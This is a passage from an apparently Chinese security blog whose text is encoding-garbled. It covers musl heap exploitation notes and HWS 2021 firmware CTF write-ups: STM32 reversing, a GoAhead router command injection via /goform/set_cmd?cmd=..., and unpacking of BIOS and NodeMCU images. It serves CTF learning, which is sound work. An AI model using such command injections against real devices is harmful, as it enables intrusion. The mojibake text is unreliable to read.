class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ²¡æœ‰æ£€æµ‹metaä¸­çš„nextå’ŒprevæŒ‡é’ˆæ˜¯å¦åˆæ³•</p>

        <h2 id="ğŸ”ºæ³¨ï¼š-1"   >
          <a href="#ğŸ”ºæ³¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š-1" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h2>
      <p>mallocå’Œfreeçš„æ—¶å€™ä¸ä¼šå°†chunkçš„å†…å®¹ç½®ç©ºï¼Œè¿™ä¸ªç»™æˆ‘ä»¬åˆ›é€ äº†UAFçš„ä¸€äº›æ¡ä»¶ï¼ŒåŒæ ·çš„ä¹Ÿæœ‰ç›¸åº”çš„é™æ€å †å†…å­˜</p>

        <h2 id="4-åˆ©ç”¨æ–¹å¼"   >
          <a href="#4-åˆ©ç”¨æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-åˆ©ç”¨æ–¹å¼" class="headerlink" title="4.åˆ©ç”¨æ–¹å¼"></a>4.åˆ©ç”¨æ–¹å¼</h2>
      
        <h3 id="1-æ³„éœ²åœ°å€-1"   >
          <a href="#1-æ³„éœ²åœ°å€-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ³„éœ²åœ°å€-1" class="headerlink" title="(1)æ³„éœ²åœ°å€"></a>(1)æ³„éœ²åœ°å€</h3>
      <p>é€šå¸¸ä½¿ç”¨é™æ€å †å†…å­˜æ¥è¿›è¡Œæ³„éœ²ï¼Œä½†æ˜¯è¿™é‡Œå°±æ¶‰åŠä¸€ä¸ªé—®é¢˜ï¼Œé™æ€å †å†…å­˜å°±ç®—ç”³è¯·åˆ°äº†ï¼Œä¹Ÿæ²¡æœ‰æŒ‡é’ˆå•Šã€‚æ‰€ä»¥ç°åœ¨çš„é¢˜ç›®å¥½å¤šéƒ½æ˜¯ç”³è¯·ä¸€ä¸ªchunkç»“æ„ä½“ï¼Œæ¯”å¦‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> size[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span>* <span class="title">myChunk</span> =</span> <span class="built_in">malloc</span>(xxx); </span><br><span class="line">myChunk.data = <span class="built_in">malloc</span>(xxx);</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·åœ¨åœ¨ä¸€å®šçš„UAFæˆ–è€…æº¢å‡ºæ¡ä»¶ä¸‹ï¼Œå°±å¯ä»¥æ³„éœ²å‡ºdataæŒ‡é’ˆï¼Œè€Œå¦‚æœè¿™ä¸ªdataæŒ‡é’ˆæ°å¥½æ˜¯ä»é™æ€å †å†…å­˜ç”³è¯·å‡ºæ¥çš„ï¼Œé‚£ä¹ˆå°±èƒ½æ³„éœ²libcåœ°å€äº†ã€‚</p>
<p>heapåœ°å€ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸€èˆ¬å°±æ˜¯é€šè¿‡æº¢å‡ºæˆ–è€…UAFä¹‹ç±»çš„æ¥æ³„éœ²äº†ã€‚</p>
<p>å¦‚æœæ²¡æœ‰çš„è¯ï¼Œæˆ‘èƒ½æƒ³åˆ°çš„å°±æ˜¯æ— é™ç”³è¯·ï¼Œç›´åˆ°è€—å°½metaçš„ç©ºé—´ï¼Œå½“å®ƒå†å¼€è¾Ÿçš„metaç©ºé—´çš„æ—¶å€™ï¼Œç”±äºæ˜¯mmapåˆ†é…çš„ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç”³è¯·å‡ºlibcçš„ç©ºé—´</p>

        <h3 id="2-getshell-1"   >
          <a href="#2-getshell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell-1" class="headerlink" title="(2)getshell"></a>(2)getshell</h3>
      
        <h4 id="â‘ secrect"   >
          <a href="#â‘ secrect" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ secrect" class="headerlink" title="â‘ secrect"></a>â‘ secrect</h4>
      <p>ç”±äº</p>

        <h4 id="â‘¡ä¼ªé€ meta"   >
          <a href="#â‘¡ä¼ªé€ meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡ä¼ªé€ meta" class="headerlink" title="â‘¡ä¼ªé€ meta"></a>â‘¡ä¼ªé€ meta</h4>
      </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/">2021HWSå›ºä»¶å­¦ä¹ </a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-21</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€ç»ƒä¹ é¢˜"   >
          <a href="#ä¸€ã€ç»ƒä¹ é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€ç»ƒä¹ é¢˜" class="headerlink" title="ä¸€ã€ç»ƒä¹ é¢˜"></a>ä¸€ã€ç»ƒä¹ é¢˜</h1>
      
        <h2 id="1-SMT32å›ºä»¶"   >
          <a href="#1-SMT32å›ºä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMT32å›ºä»¶" class="headerlink" title="1.SMT32å›ºä»¶"></a>1.SMT32å›ºä»¶</h2>
      
        <h3 id="1-IDAåˆ†æ"   >
          <a href="#1-IDAåˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-IDAåˆ†æ" class="headerlink" title="(1)IDAåˆ†æ"></a>(1)IDAåˆ†æ</h3>
      
        <h4 id="â‘ é€‰æ‹©æ¶æ„"   >
          <a href="#â‘ é€‰æ‹©æ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ é€‰æ‹©æ¶æ„" class="headerlink" title="â‘ é€‰æ‹©æ¶æ„"></a>â‘ é€‰æ‹©æ¶æ„</h4>
      <p>éœ€è¦åœ¨åŠ è½½ç•Œé¢é€‰æ‹©æ¶æ„ï¼Œå¦‚å›¾é€‰æ‹©ARMå°ç«¯åº</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png" alt="image-20220119162036357"></p>

        <h4 id="â‘¡è®¾ç½®é€‰é¡¹"   >
          <a href="#â‘¡è®¾ç½®é€‰é¡¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡è®¾ç½®é€‰é¡¹" class="headerlink" title="â‘¡è®¾ç½®é€‰é¡¹"></a>â‘¡è®¾ç½®é€‰é¡¹</h4>
      <p>å¤„ç†å™¨é€‰é¡¹è®¾ç½®å¯¹åº”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191621446.png" alt="du"></p>

        <h4 id="â‘¢é€‰æ‹©å›ºä»¶åŠ è½½åœ°å€"   >
          <a href="#â‘¢é€‰æ‹©å›ºä»¶åŠ è½½åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢é€‰æ‹©å›ºä»¶åŠ è½½åœ°å€" class="headerlink" title="â‘¢é€‰æ‹©å›ºä»¶åŠ è½½åœ°å€"></a>â‘¢é€‰æ‹©å›ºä»¶åŠ è½½åœ°å€</h4>
      <p>OKä¹‹åï¼Œè¿›å…¥å¡«å†™åŠ è½½åœ°å€çš„ç•Œé¢ï¼Œä¿®æ”¹å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191623892.png" alt="image-20220119162333850"></p>
<p>è¿™ä¸ªå¯¹äºSMT32è¿™ç§ç±»å‹çš„å›ºä»¶æ˜¯ä¸€å®šçš„ï¼Œéœ€è¦è‡ªå·±å»ä¸Šç½‘æŸ¥è¯¢ï¼ŒInput fileçš„loading addresså¯ä»¥è®©æˆ‘ä»¬è¾“å…¥å…¶ä»–å€¼ï¼Œå°±ä½¿å¾—IDAä¸ä»å¤´åŠ è½½ï¼Œè€Œä»æˆ‘ä»¬è¾“å…¥çš„åœ°å€å¼€å§‹åŠ è½½ã€‚</p>

        <h4 id="â‘£å¯»æ‰¾å‡½æ•°åœ°å€"   >
          <a href="#â‘£å¯»æ‰¾å‡½æ•°åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£å¯»æ‰¾å‡½æ•°åœ°å€" class="headerlink" title="â‘£å¯»æ‰¾å‡½æ•°åœ°å€"></a>â‘£å¯»æ‰¾å‡½æ•°åœ°å€</h4>
      
        <h4 id="A-æŸ¥æ‰¾ä¸­æ–­å¤„ç†å‡½æ•°"   >
          <a href="#A-æŸ¥æ‰¾ä¸­æ–­å¤„ç†å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æŸ¥æ‰¾ä¸­æ–­å¤„ç†å‡½æ•°" class="headerlink" title="A.æŸ¥æ‰¾ä¸­æ–­å¤„ç†å‡½æ•°"></a>A.æŸ¥æ‰¾ä¸­æ–­å¤„ç†å‡½æ•°</h4>
      <p>åœ¨æœ€å¼€å¤´åœ°å€+4çš„åœ°æ–¹ä¿å­˜çš„æ˜¯ä¸­æ–­å¤„ç†å‡½æ•°ï¼ŒæŒ‰dè½¬æ¢æ•°æ®åŒå‡»ç‚¹è¿›å»å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191626607.png" alt="image-20220119162645572"></p>

        <h4 id="B-è¯†åˆ«å‡½æ•°"   >
          <a href="#B-è¯†åˆ«å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-è¯†åˆ«å‡½æ•°" class="headerlink" title="B.è¯†åˆ«å‡½æ•°"></a>B.è¯†åˆ«å‡½æ•°</h4>
      <p>å‘ç°æ˜¯å¥‡æ•°åœ°å€ï¼Œé‚£ä¹ˆåœ¨å¥‡æ•°åœ°å€-1çš„åœ°æ–¹ï¼ŒæŒ‰cï¼Œå³å¯åˆ†æå‡ºä¸€äº›å‡½æ•°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191628430.png" alt="image-20220119162843385"></p>
<p>å…¶ä¸­0x08000100å³ä¸ºä¸­æ–­å¤„ç†å‡½æ•°ï¼Œç›¸å¯¹äºSMT32å›ºä»¶è€Œè¨€ï¼Œè¯¥å‡½æ•°çš„ç¬¬äºŒæ¬¡è·³è½¬åœ°å€ä¸Šçš„é¦–æ¬¡è·³è½¬çš„æœ€åè·³è½¬å†è·³è½¬å³ä¸ºmainå‡½æ•°åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632420.png" alt="image-20220119163217387"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632453.png" alt="image-20220119163231426"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632698.png" alt="image-20220119163255655"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633721.png" alt="image-20220119163337683"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633077.png" alt="image-20220119163359036"></p>

        <h3 id="2-è§£å¯†"   >
          <a href="#2-è§£å¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£å¯†" class="headerlink" title="(2)è§£å¯†"></a>(2)è§£å¯†</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191636846.png" alt="image-20220119163634811"></p>
<p>åˆ†æä¹‹åï¼Œå³å¯æ‰¾åˆ°å¯¹åº”çš„åŠ å¯†ç®—æ³•ï¼ŒæŒ‰ç…§ä¸Šè¿°é€»è¾‘æ¢å¤å³å¯</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = [   </span><br><span class="line">        <span class="number">0x7D</span>,<span class="number">0x77</span>,<span class="number">0x40</span>,<span class="number">0x7A</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x2A</span>,<span class="number">0x2F</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x40</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x2C</span>,<span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x2B</span>,<span class="number">0x28</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x7C</span>,<span class="number">0x41</span>,<span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0x7E</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2A</span>,<span class="number">0x41</span>,<span class="number">0x7F</span>,<span class="number">0x2F</span>,<span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="built_in">chr</span>((i ^ <span class="number">0x1E</span>) + <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-BlinkBlink-200"   >
          <a href="#2-BlinkBlink-200" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BlinkBlink-200" class="headerlink" title="2.BlinkBlink_200"></a>2.BlinkBlink_200</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/#blinkblink" >HWS2021å†¬ä»¤è¥é€‰æ‹”èµ› | Clangé±¼å¡˜ (blingblingxuanxuan.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-å›ºä»¶è§£åŒ…"   >
          <a href="#1-å›ºä»¶è§£åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å›ºä»¶è§£åŒ…" class="headerlink" title="(1)å›ºä»¶è§£åŒ…"></a>(1)å›ºä»¶è§£åŒ…</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me uImage</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å½“å‰ç›®å½•æœç´¢"   >
          <a href="#2-å½“å‰ç›®å½•æœç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å½“å‰ç›®å½•æœç´¢" class="headerlink" title="(2)å½“å‰ç›®å½•æœç´¢"></a>(2)å½“å‰ç›®å½•æœç´¢</h3>
      <p>è¯¥å‘½ä»¤å¯åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æœç´¢å¯†ç ï¼Œä¸€èˆ¬è¿™ç§è·¯ç”±å™¨çš„å¯†ç éƒ½æ˜¯ä»/etc/passwdä¸­å–å¾—</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri &quot;etc/passwd&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191744973.png" alt="image-20220119174406881"></p>
<p>æ’é™¤busyboxå’Œlibcï¼Œé‚£ä¹ˆå…ˆå»goaheadä¸­æ‰¾ï¼Œç›´æ¥æ‹–è¿›IDA32åˆ†æ</p>
<p>goaheadæ˜¯ä¸€ä¸ªåµŒå…¥å¼çš„WebæœåŠ¡å™¨ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.embedthis.com/goahead/" >https://www.embedthis.com/goahead/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="â‘ å®šä½å­—ç¬¦ä¸²"   >
          <a href="#â‘ å®šä½å­—ç¬¦ä¸²" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å®šä½å­—ç¬¦ä¸²" class="headerlink" title="â‘ å®šä½å­—ç¬¦ä¸²"></a>â‘ å®šä½å­—ç¬¦ä¸²</h4>
      <p>æœç´¢å­—ç¬¦ä¸²<code>set_qos_cfg</code>ï¼Œè¿™ä¸ªå¸¸ç”¨ï¼Œæ‰¾åˆ°å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191752096.png" alt="image-20220119175251051"></p>
<p>æ¼æ´å¸¸å¸¸åœ¨<code>goform</code>æ¥å£ä¸‹ï¼Œç®€å•æŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°å…¶ä¸­æœ‰ä¸€ä¸ª<code>set_cmd</code>çš„å¼•ç”¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191755068.png" alt="image-20220119175504033"></p>
<p>è¿›å…¥å‡½æ•°ï¼Œå‘ç°ä¸€ä¸ªè®¾ç½®å‘½ä»¤çš„å‡½æ•°<code>bs_SetCmd</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191756417.png" alt="image-20220119175643376"></p>

        <h4 id="â‘¡åˆ†æå‡½æ•°"   >
          <a href="#â‘¡åˆ†æå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åˆ†æå‡½æ•°" class="headerlink" title="â‘¡åˆ†æå‡½æ•°"></a>â‘¡åˆ†æå‡½æ•°</h4>
      <p>å‚ç…§ä¸Šé¢çš„å‡½æ•°åç§°ï¼Œç»§ç»­æœç´¢</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191758415.png" alt="image-20220119175815328"></p>
<p>å‘ç°å®šä½åœ¨libshareä¸­ï¼Œæ‰“å¼€åˆ†æä¸€ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191803171.png" alt="image-20220119180323116"></p>
<p>å…¶ä¸­off_4F2CCçš„å€¼ä¸º%sï¼Œå³æ ¼å¼åŒ–ä¸ºå­—ç¬¦ä¸²è¾“å‡ºç»™v21ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾å°±æ˜¯ä½¿ç”¨<code>popen</code>è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191806862.png" alt="image-20220119180607832"></p>

        <h4 id="â‘¢URLè®¿é—®"   >
          <a href="#â‘¢URLè®¿é—®" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢URLè®¿é—®" class="headerlink" title="â‘¢URLè®¿é—®"></a>â‘¢URLè®¿é—®</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goform/set_cmd?cmd=cat /home/goahead/flag.txt</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±æ˜¯è°ƒç”¨goformçš„æ¥å£APIè¿›è¡Œæµ‹è¯•å³å¯è·å¾—flag</p>

        <h2 id="3-httpd"   >
          <a href="#3-httpd" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-httpd" class="headerlink" title="3.httpd"></a>3.httpd</h2>
      <p>ä¸å¤ªä¼š</p>

        <h2 id="4-nodemcu"   >
          <a href="#4-nodemcu" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-nodemcu" class="headerlink" title="4.nodemcu"></a>4.nodemcu</h2>
      <p>ç›´æ¥å‡º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings nodemcu.bin</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201257297.png" alt="image-20220120125706243"></p>
<p>çœ‹æ¥ä»¥åéƒ½å…ˆstringsä¸€æŠŠæ¢­è¯•è¯•</p>

        <h2 id="5-easybios"   >
          <a href="#5-easybios" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-easybios" class="headerlink" title="5.easybios"></a>5.easybios</h2>
      
        <h3 id="1-å‰ç½®æ¢ç´¢"   >
          <a href="#1-å‰ç½®æ¢ç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®æ¢ç´¢" class="headerlink" title="(1)å‰ç½®æ¢ç´¢"></a>(1)å‰ç½®æ¢ç´¢</h3>
      <p>æŒ‰ç…§å‘½ä»¤æç¤ºå¯åŠ¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™å¯ä»¥ï¼Œæœ‰æ—¶å€™åˆä¸å¯ä»¥ï¼Œå¯èƒ½åœ¨ç­‰ä¸€ä¸‹å°±å¯ä»¥ï¼Ÿ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201305567.png" alt="image-20220120130559529">ç»™äº†æç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307664.png" alt="image-20220120130724621"></p>
<p>å°è¯•ä¸€ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307395.png" alt="image-20220120130702363"></p>

        <h3 id="2-IDAåˆ†æ"   >
          <a href="#2-IDAåˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IDAåˆ†æ" class="headerlink" title="(2)IDAåˆ†æ"></a>(2)IDAåˆ†æ</h3>
      <p>ä½¿ç”¨binwalkè§£åŒ…</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me easybios</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åIDAæ‰“å¼€è§£åŒ…å‡ºæ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201436882.png" alt="image-20220120143603848"></p>
<p>æœç´¢ä¸€ä¸‹Wrongå­—ç¬¦ä¸²ï¼Œæ²¡æœåˆ°ï¼Œå°è¯•ç”¨unicodeæ ¼å¼æœç´¢ï¼Œå³UTF-16LEæ ¼å¼ï¼Œä¸€ä¸ªå­—ç¬¦ä¸¤ä¸ªå­—èŠ‚ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201442069.png" alt="image-20220120144209024"></p>
<p>ç„¶ååŠ ä¸Š00å³å¯-&gt;<code>57 00 72 00 6F 00 6E 00 67 00</code>ï¼Œæ‰¾åˆ°ä¸¤ä¸ª</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201446022.png" alt="image-20220120144641985"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447384.png" alt="image-20220120144707349"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447608.png" alt="image-20220120144725574"></p>
<p>å¾ˆæ˜æ˜¾åº”è¯¥æ˜¯ä¸‹é¢é‚£ä¸ªï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œä¸å¥½è§£æï¼Œå†åŠ ä¸Šä¹‹å‰åœ¨è§£åŒ…çš„æ—¶å€™çœ‹åˆ°åŒ…å«å¾ˆå¤šPEæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™ä¸ªç¨‹åºåº”è¯¥ä¹Ÿæ˜¯åœ¨ä¸€ä¸ªPEæ–‡ä»¶é‡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾æ®åœ°å€ï¼Œæ‰¾åˆ°å¯¹åº”çš„PEæ–‡ä»¶å¤´å°¾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201505983.png" alt="image-20220120150501890"></p>

        <h3 id="3-åˆ‡å‰²åˆ†æ"   >
          <a href="#3-åˆ‡å‰²åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ‡å‰²åˆ†æ" class="headerlink" title="(3)åˆ‡å‰²åˆ†æ"></a>(3)åˆ‡å‰²åˆ†æ</h3>
      
        <h4 id="â‘ å¯»æ‰¾å¤´å°¾åœ°å€"   >
          <a href="#â‘ å¯»æ‰¾å¤´å°¾åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å¯»æ‰¾å¤´å°¾åœ°å€" class="headerlink" title="â‘ å¯»æ‰¾å¤´å°¾åœ°å€"></a>â‘ å¯»æ‰¾å¤´å°¾åœ°å€</h4>
      <p>ä¾æ®åœ°å€æ‰¾åˆ°ä»¥ä¸‹å¤´å°¾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201553654.png" alt="image-20220120155301520"></p>

        <h4 id="â‘¡ä½¿ç”¨Winhexè¿›è¡Œåˆ‡å‰²"   >
          <a href="#â‘¡ä½¿ç”¨Winhexè¿›è¡Œåˆ‡å‰²" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡ä½¿ç”¨Winhexè¿›è¡Œåˆ‡å‰²" class="headerlink" title="â‘¡ä½¿ç”¨Winhexè¿›è¡Œåˆ‡å‰²"></a>â‘¡ä½¿ç”¨Winhexè¿›è¡Œåˆ‡å‰²</h4>
      <p>ä½¿ç”¨Winhexæ‰“å¼€ï¼Œç„¶åæ‰¾åˆ°å¤´å°¾ï¼Œä½¿ç”¨alt+Gæœç´¢åœ°å€ï¼Œé€‰å®šå¤´å°¾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201557194.png" alt="image-20220120155739157"></p>
<p>å¤´éƒ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201558569.png" alt="image-20220120155816532"></p>
<p>å°¾éƒ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201559030.png" alt="image-20220120155907991"></p>
<p>é€‰ä¸­é€‰å¿«ï¼Œå³é”®ç¼–è¾‘-&gt;å¤åˆ¶é€‰å—-&gt;è‡³æ–°æ–‡ä»¶ï¼Œç„¶åä¿å­˜ç”¨IDAæ‰“å¼€ï¼Œç…§å¸¸ä½¿ç”¨å…¨å±€æœç´¢å­—ç¬¦<code>57 00 72 00 6F 00 6E 00 67 00</code>æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°<code>sub_31D6F</code>ï¼Œä¸€ç•ªåˆ¤æ–­å¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201549732.png" alt="image-20220120154940674"></p>
<p>ç„¶åé¡ºç€é€»è¾‘ç†æ¸…æ¥šå³å¯ï¼Œæˆ–è€…å°è¯•ä½¿ç”¨angrè§£é¢˜ï¼Œä»¥ä¸‹expå‚ç…§<code>lxonzå¸ˆå‚…</code></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://nosec.org/home/detail/4672.html" >2021HWSå†¬ä»¤è¥çº¿ä¸Šèµ›å›ºä»¶å®‰å…¨WriteUp|NOSECå®‰å…¨è®¯æ¯å¹³å° - ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 